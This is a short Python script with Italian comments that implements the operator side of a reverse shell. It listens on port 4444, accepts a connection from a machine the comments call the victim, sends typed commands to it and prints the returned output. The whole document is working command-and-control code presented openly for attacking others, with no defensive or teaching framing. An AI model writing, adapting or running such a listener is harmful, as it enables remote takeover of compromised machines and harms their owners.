import socket
import subprocess

# Parametri per la connessione
LHOST = '0.0.0.0'  # Ascolta su tutte le interfacce
LPORT = 4444  # Porta su cui il server è in ascolto

# Funzione per gestire la connessione con la vittima
def create_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((LHOST, LPORT))
    server.listen(1)
    print(f"Server in ascolto su {LHOST}:{LPORT}")
    
    client_socket, client_address = server.accept()
    print(f"Connessione stabilita con {client_address}")
    
    while True:
        # Richiesta del comando
        command = input("Inserisci il comando da eseguire sulla vittima: ")
        if command.lower() == 'exit':
            client_socket.send(b'exit')
            break
        
        # Invia il comando al client (vittima)
        client_socket.send(command.encode())

        # Ricevi l'output del comando
        result = client_socket.recv(4096)
        print(result.decode())
    
    client_socket.close()

if __name__ == "__main__":
    create_server()
